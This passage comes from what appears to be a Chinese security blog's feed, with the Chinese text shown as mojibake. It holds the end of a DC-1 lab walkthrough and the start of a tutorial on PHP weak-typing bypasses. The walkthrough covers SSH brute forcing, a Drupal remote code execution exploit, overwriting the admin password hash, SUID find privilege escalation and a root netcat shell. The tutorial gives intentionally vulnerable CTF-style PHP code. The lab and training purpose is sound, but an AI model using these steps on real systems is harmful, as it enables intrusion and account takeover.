</span><span class="language-bash">ports=$(nmap -p- -sS -n --min-rate=1000 -T4 192.168.101.132 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sV -n -p<span class="variable">$ports</span> -T4 -A 192.168.101.132 -oN nmap.txt</span></span><br></pre></td></tr></table></figure><p>å‘ç°22ã€80ã€111ç«¯å£ï¼Œå°è¯•shhçˆ†ç ´(nmapä¹Ÿèƒ½çˆ†ç ´)</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/**rockyou**.txt -f -o hydra.txt -u</span></span><br></pre></td></tr></table></figure><p>å‘ç°sshçˆ†ç ´å¤±è´¥ï¼Œå°è¯•80ç«¯å£çš„webæœåŠ¡<br>ç½‘ç«™å°±ä¸€ç™»å½•é¡µé¢ï¼Œæ³¨å†Œè´¦æˆ·å‘ç°ä¸èƒ½è®¾ç½®å¯†ç ï¼Œæç¤ºæ‹¿åˆ°adminç”¨æˆ·çš„æƒé™ï¼Œæ‰«cmsã€‚</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wahtweb http://192.168.101.132</span></span><br></pre></td></tr></table></figure><p>å‘ç°å…¶cmsä¸ºdrupalï¼Œå°è¯•drupalæ¼æ´åˆ©ç”¨</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">searchsploit drupal</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">searchsploit -m php/webapps/xxxxx.rb</span></span><br></pre></td></tr></table></figure><p>å‘ç°drupal cmså­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå°è¯•åˆ©ç”¨ï¼ŒæˆåŠŸè·å–webshell</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whomai</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">www-data</span></span><br></pre></td></tr></table></figure><p>å¼€äº¤äº’shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰æ¼æ´ä¹Ÿå¯ä»¥ç›´æ¥ç”¨msf<br>ä½¿ç”¨2018å¹´çš„æ¼æ´å§ï¼Œæ˜¯ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œ(ä»£ç å®¡è®¡ç°åœ¨çœŸå¿ƒçœ‹ä¸æ‡‚ï¼ŒğŸ˜”)<br><a href="https://www.exploit-db.com/exploits/44482">https://www.exploit-db.com/exploits/44482</a><br><a href="https://paper.seebug.org/567/">https://paper.seebug.org/567/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: \core\lib\Drupal\Core\Render\Renderer.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$elements</span>[<span class="string">&#x27;#pre_render&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$elements</span>[<span class="string">&#x27;#pre_render&#x27;</span>] <span class="keyword">as</span> <span class="variable">$callable</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$callable</span>) &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$callable</span>, <span class="string">&#x27;::&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="variable">$callable</span> = <span class="variable language_">$this</span>-&gt;controllerResolver-&gt;<span class="title function_ invoke__">getControllerFromDefinition</span>(<span class="variable">$callable</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$elements</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$callable</span>, <span class="variable">$elements</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="æ•°æ®åº“æ”»å‡»"><a href="#æ•°æ®åº“æ”»å‡»" class="headerlink" title="æ•°æ®åº“æ”»å‡»"></a>æ•°æ®åº“æ”»å‡»</h1><p>å½“å‰ç›®å½•ä¸‹æ‰¾åˆ°flag1ï¼Œ/home/flag4ä¸‹å‘ç°flag4ï¼Œflag1æç¤ºå»çœ‹drupalé»˜è®¤é…ç½®æ–‡ä»¶ï¼ŒæŸ¥çœ‹é»˜è®¤é…ç½®æ–‡ä»¶å‘ç°mysqlæ•æ„Ÿä¿¡æ¯</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt;</span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt;</span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>è¿™è¾¹çœ‹åˆ°äº†flag2<br>ç™»å½•mysqlæ•°æ®åº“ï¼ŒæŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯ï¼ŒæŸ¥çœ‹ä¸€ä¸‹nodeå’Œuserè¡¨ï¼Œå‘ç°flag3ï¼Œuidä¸º1ï¼Œè¯´æ˜è¦adminæƒé™ã€‚å‘ç°adminè´¦æˆ·passç»è¿‡hashåŠ å¯†ï¼ŒhashåŠ å¯†ç®—æ³•ä¸å¯çŸ¥ã€‚<br>è¿™è¾¹æœ‰ä¸¤ä¸ªæ€è·¯ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªè´¦å·å°†äºŒè€…hashäº’æ¢ï¼Œä½†æ˜¯æ³¨å†Œæ—¶æ— æ³•å†™å¯†ç ï¼Œç¬¬äºŒä¸ªä¾¿æ˜¯æˆ‘ä»¬æ‰¾åˆ°åŠ å¯†è„šæœ¬ï¼Œå°†æˆ‘ä»¬çš„å¯†ç åŠ å¯†åå†™å…¥æ•°æ®åº“ã€‚å‘ç°åŠ å¯†è„šæœ¬ä½ç½®scripts/password-hash.sh<br>è¿™é‡Œä¸ºä»€ä¹ˆè¦çœ‹nodeè¡¨å‘¢ï¼Ÿï¼Ÿï¼Ÿ(userè¡¨å°±ä¸è¯´äº†å§)<br>å› ä¸º<a href="https://www.cnblogs.com/amw863/p/4551889.html">drupal nodeæœºåˆ¶ç†è§£</a></p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br><span class="line">password: admin          hash: $S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.</span><br></pre></td></tr></table></figure><p>æ›´æ¢ç®¡ç†å‘˜å¯†ç çš„hashã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç™»å½•adminè´¦æˆ·åæ‹¿åˆ°flag3ã€‚<br>Special PERMS will help FIND the passwd - but youâ€™ll need to -exec that command to work out how to get whatâ€™s in the shadow.<br>FINDï¼Œ-execæç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œfindææƒã€‚flag4ä¹Ÿæç¤ºæˆ‘ä»¬è¦ææƒåˆ°rootã€‚</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸åŒç³»ç»Ÿé€‚ç”¨äºä¸åŒçš„å‘½ä»¤</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -user root -perm -4000-print2&gt;/dev/null</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span></span><br></pre></td></tr></table></figure><p>å°è¯•æŸ¥çœ‹findæ˜¯å¦æœ‰suidæƒé™</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -exec whoami  \;</span><br></pre></td></tr></table></figure><p>find å‘½ä»¤è¯´æ˜<br>-exec å‚æ•°åé¢è·Ÿçš„æ˜¯commandå‘½ä»¤ï¼Œå®ƒçš„ç»ˆæ­¢æ˜¯ä»¥;ä¸ºç»“æŸæ ‡å¿—çš„ï¼Œæ‰€ä»¥è¿™å¥å‘½ä»¤åé¢çš„åˆ†å·æ˜¯ä¸å¯ç¼ºå°‘çš„ï¼Œè€ƒè™‘åˆ°å„ä¸ªç³»ç»Ÿä¸­åˆ†å·ä¼šæœ‰ä¸åŒçš„æ„ä¹‰ï¼Œæ‰€ä»¥å‰é¢åŠ åæ–œæ ã€‚-execå‚æ•°åé¢è·Ÿçš„å°±æ˜¯æˆ‘ä»¬æƒ³è¿›ä¸€æ­¥æ“ä½œçš„å‘½ä»¤,soï¼Œæˆ‘ä»¬å¯ä»¥ä»¥rootçš„æƒé™å‘½ä»¤æ‰§è¡Œäº†ã€‚<br>ç•™ä¸€ä¸ªrootçš„netcatçš„åé—¨</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -exec netcat -lvp 4444 -e &quot;/bin/sh&quot; \;</span><br><span class="line">nc 192.168.124.145 4444</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æœ€åä¸€ä¸ªflagã€‚</p><p>Well done!!!!</p><p>Hopefully youâ€™ve enjoyed this and learned some new skills.</p><p>You can let me know what you thought of this little journey\<br>by contacting me via Twitter - @DCAU7</p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DCç³»åˆ—é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP--å®‰å…¨ç‰¹æ€§</title>
      <link href="/posts/fba9.html"/>
      <url>/posts/fba9.html</url>
      
        <content type="html"><![CDATA[<h1 id="å¼ºç±»å‹ä¸å¼±ç±»å‹"><a href="#å¼ºç±»å‹ä¸å¼±ç±»å‹" class="headerlink" title="å¼ºç±»å‹ä¸å¼±ç±»å‹"></a>å¼ºç±»å‹ä¸å¼±ç±»å‹</h1><p><strong>å¼ºç±»å‹</strong></p><ul><li><p>æ‰€è°“å¼ºç±»å‹(Strongly typed)ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯å¼ºåˆ¶æ•°æ®ç±»å‹å®šä¹‰çš„è¯­è¨€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ä¸€ä¸ªå˜é‡è¢«æŒ‡å®šäº†æŸä¸ªæ•°æ®ç±»å‹ï¼Œå¦‚æœä¸ç»è¿‡å¼ºåˆ¶è½¬æ¢ï¼Œé‚£ä¹ˆå®ƒå°±æ°¸è¿œæ˜¯è¿™ä¸ªæ•°æ®ç±»å‹ã€‚J</p></li><li><p>avaã€.NETã€C++ç­‰éƒ½æ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œåœ¨å˜é‡ä½¿ç”¨ä¹‹å‰å¿…é¡»å£°æ˜å˜é‡çš„ç±»å‹å’Œåç§°ï¼›ä¸”ä¸ç»å¼ºåˆ¶è½¬æ¢ä¸å…è®¸ä¸¤ç§ä¸åŒç±»å‹çš„å˜é‡äº’ç›¸æ“ä½œã€‚</p></li></ul><p><strong>å¼±ç±»å‹</strong></p><ul><li>å¯¹æ•°æ®çš„ç±»å‹è¦æ±‚å¹¶ä¸ä¸¥æ ¼ï¼Œå¯ä»¥è®©æ•°æ®ç±»å‹äº’ç›¸è½¬æ¢ã€‚</li></ul><h2 id="PHPä¸­â€œ-â€å’Œâ€œ-â€çš„åŒºåˆ«"><a href="#PHPä¸­â€œ-â€å’Œâ€œ-â€çš„åŒºåˆ«" class="headerlink" title="PHPä¸­â€œ==â€å’Œâ€œ===â€çš„åŒºåˆ«"></a>PHPä¸­â€œ==â€å’Œâ€œ===â€çš„åŒºåˆ«</h2><p>â€œ==â€å’Œâ€œ===â€éƒ½æ˜¯ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªæ•°å€¼æ˜¯å¦ç›¸ç­‰çš„æ“ä½œç¬¦ã€‚</p><p>å½“æ¯”è¾ƒçš„ä¸¤ä¸ªå€¼éƒ½æ˜¯ç›¸åŒç±»å‹æ—¶å€™â€œ==â€å’Œâ€œ===â€æ˜¯ç›¸ç­‰çš„ã€‚</p><p>1==1ï¼ˆä¸¤ä¸ªintï¼‰1.0==1.0ï¼ˆä¸¤ä¸ªfloatï¼‰â€˜H1TerHubâ€™==â€™H1TerHubâ€˜ï¼ˆä¸¤ä¸ªå­—ç¬¦ä¸²ï¼‰</p><p><strong>ATTENTIONï¼šåœ¨å‰åä¸¤ä¸ªå€¼çš„ç±»å‹ä¸ä¸€æ ·çš„æ—¶å€™ï¼Œâ€˜==â€™ä¼šè‡ªåŠ¨è½¬æ¢ç±»å‹</strong></p><p><img src="https://www.runoob.com/wp-content/uploads/2019/05/xxxxphp.png" alt="img"></p><p>ä¸€èˆ¬çœ‹åˆ°â€œ==â€å°±å¯ä»¥å…³æ³¨æ˜¯å¦å­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒ</p><h2 id="â€œ-â€ç±»å‹è½¬æ¢çš„è§„åˆ™"><a href="#â€œ-â€ç±»å‹è½¬æ¢çš„è§„åˆ™" class="headerlink" title="â€œ==â€ç±»å‹è½¬æ¢çš„è§„åˆ™"></a>â€œ==â€ç±»å‹è½¬æ¢çš„è§„åˆ™</h2><p>1ã€å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å­—ã€‚</p><p>â€œadminâ€==0(true)//adminè¢«è½¬æ¢æˆæ•°å­—ï¼Œç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬æ¢å¤±è´¥ï¼Œintï¼ˆadminï¼‰=0ï¼Œæ‰€ä»¥æ¯”è¾ƒç»“æœæ˜¯trueã€‚</p><p>2ã€æ··åˆå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—ï¼Œçœ‹å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªã€‚</p><p>â€œ1adminâ€==1 â€œ2adminâ€==2</p><p>3ã€å­—ç¬¦ä¸²å¼€å¤´ä»¥xexå¼€å¤´ï¼Œxä»£è¡¨æ•°å­—ã€‚ä¼šè¢«è½¬æ¢æˆç§‘å­¦è®¡æ•°æ³•ã€‚</p><p>x*10^xçš„å½¢å¼ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â€˜2e2â€™=2*10^2=200</span><br><span class="line">â€œ-2e2â€=-2*10^2 â€œ0e2â€=0*10^2=0 </span><br><span class="line">â€œhh-2e2â€=0</span><br><span class="line">â€œ1hh-2e2â€=1</span><br></pre></td></tr></table></figure><p><img src="https://www.runoob.com/wp-content/uploads/2019/05/1791863413-572055b100304_articlex.png" alt="img"></p><h2 id="boolç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦ä¸²å¯ä»¥å¼±ç±»å‹ç›¸ç­‰"><a href="#boolç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦ä¸²å¯ä»¥å¼±ç±»å‹ç›¸ç­‰" class="headerlink" title="boolç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦ä¸²å¯ä»¥å¼±ç±»å‹ç›¸ç­‰"></a>boolç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦ä¸²å¯ä»¥å¼±ç±»å‹ç›¸ç­‰</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>=â€œH1TerHubâ€)&#123;</span><br><span class="line"><span class="keyword">echo</span> â€œsuccessâ€;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åº”ç”¨èŒƒä¾‹ï¼š"><a href="#åº”ç”¨èŒƒä¾‹ï¼š" class="headerlink" title="åº”ç”¨èŒƒä¾‹ï¼š"></a>åº”ç”¨èŒƒä¾‹ï¼š</h1><h2 id="Is-numericç±»å‹è½¬æ¢ç¼ºé™·"><a href="#Is-numericç±»å‹è½¬æ¢ç¼ºé™·" class="headerlink" title="Is_numericç±»å‹è½¬æ¢ç¼ºé™·"></a>Is_numericç±»å‹è½¬æ¢ç¼ºé™·</h2><p>PHPæä¾›äº†is_numericå‡½æ•°ï¼Œç”¨æ¥å˜é‡åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ã€‚PHPå¼±ç±»å‹è¯­è¨€çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå½“ä¸€ä¸ªæ•´å½¢å’Œä¸€ä¸ªå…¶ä»–ç±»å‹è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹intvalæ•°å­—åŒ–å†æ¯”ã€‚<br>æ¥çœ‹çœ‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span> == <span class="number">2019</span>)<span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;sorry&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯¹GETæ–¹å¼æäº¤çš„å‚æ•°numçš„å€¼è¿›è¡Œæ£€éªŒã€‚numé€šè¿‡is_numericå‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¦‚æœä¸ºæ•°å­—çš„è¯ï¼Œåˆ™æ˜¾ç¤ºsorryã€‚å¦‚æœä¸æ˜¯æ•°å­—çš„è¯ï¼Œå†å’Œ2019è¿›è¡Œæ¯”è¾ƒï¼Œidçš„å€¼ä¸º2019çš„æ—¶å€™è¾“å‡ºflagã€‚<br>PHPå¼±ç±»å‹è¯­è¨€æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå½“ä¸€ä¸ªæ•´å½¢å’Œä¸€ä¸ªå…¶ä»–ç±»å‹è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹intvalæ•°å­—åŒ–å†æ¯”ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å°±å¯ä»¥å¾ˆå¥½çš„ç»•è¿‡ã€‚</p><h2 id="extract-å˜é‡è¦†ç›–"><a href="#extract-å˜é‡è¦†ç›–" class="headerlink" title="extract()å˜é‡è¦†ç›–"></a>extract()å˜é‡è¦†ç›–</h2><p>ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxx&#125;!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract() å‡½æ•°</p><p>ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚è¯¥å‡½æ•°è¿”å›æˆåŠŸè®¾ç½®çš„å˜é‡æ•°ç›®ã€‚ä¸ºäº†æ‹¿åˆ°flagï¼Œéœ€è¦authå€¼ä¸º1ï¼Œæ­¤å¤„æˆ‘ä»¬åˆ©ç”¨extract()å˜é‡è¦†ç›–çš„ç¼ºé™·ï¼Œå°†authè¦†ç›–ä¸º1ã€‚</p><h2 id="Strcmpå‡½æ•°çš„æ¼æ´"><a href="#Strcmpå‡½æ•°çš„æ¼æ´" class="headerlink" title="Strcmpå‡½æ•°çš„æ¼æ´"></a>Strcmpå‡½æ•°çš„æ¼æ´</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span>=<span class="string">&quot;***************&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$password</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxx-xxx-xxxx&#125;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;NO password &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼ å…¥password[]=xxxå¯ä»¥ç»•è¿‡<br>æ˜¯å› ä¸ºå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œå°†å‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°è¿”å›å€¼ä¸º0ï¼Œæ‰€ä»¥åˆ¤æ–­ç›¸ç­‰</p><h2 id="sha1-md5å‡½æ•°çš„æ¼æ´"><a href="#sha1-md5å‡½æ•°çš„æ¼æ´" class="headerlink" title="sha1,md5å‡½æ•°çš„æ¼æ´"></a>sha1,md5å‡½æ•°çš„æ¼æ´</h2><p>ä¸strcmpå‡½æ•°ç±»ä¼¼ï¼Œsha1ã€md5ä¹Ÿæœ‰ç›¸åŒçš„æ¼æ´ã€‚</p><h2 id="switchç»•è¿‡"><a href="#switchç»•è¿‡" class="headerlink" title="switchç»•è¿‡"></a>switchç»•è¿‡</h2><p>è¿™ä¸ªåŸç†å’Œä¹‹å‰çš„â€œ==â€ç›¸ä¼¼</p><h2 id="jsonç»•è¿‡"><a href="#jsonç»•è¿‡" class="headerlink" title="jsonç»•è¿‡"></a>jsonç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å…¥ä¸€ä¸ªjsonç±»å‹çš„å­—ç¬¦ä¸²ï¼Œjson_decodeå‡½æ•°è§£å¯†æˆä¸€ä¸ªæ•°ç»„ï¼Œåˆ¤æ–­æ•°ç»„ä¸­keyçš„å€¼æ˜¯å¦ç­‰äº<br><code>$key</code>çš„å€¼ï¼Œä½†æ˜¯<code>$key</code>çš„å€¼æˆ‘ä»¬ä¸çŸ¥é“</p><p>è¿™æ—¶æˆ‘ä»¬æ„é€ ä¸€ä¸ªå’Œä»»æ„å­—ç¬¦ä¸²è¿”å›ä¸ºçœŸçš„æ•°ç»„{â€œkeyâ€:true}ã€‚å³å¯ç»•è¿‡</p><p>payload=message={â€œkeyâ€,true}</p><h2 id="array-searchçš„æ¼æ´"><a href="#array-searchçš„æ¼æ´" class="headerlink" title="array_searchçš„æ¼æ´"></a>array_searchçš„æ¼æ´</h2><p>array_search() å‡½æ•°ä¸ <a href="https://link.zhihu.com/?target=http%3A//www.w3school.com.cn/php/func_array_in_array.asp">in_array</a><a href="https://link.zhihu.com/?target=http%3A//www.w3school.com.cn/php/func_array_in_array.asp">()</a> ä¸€æ 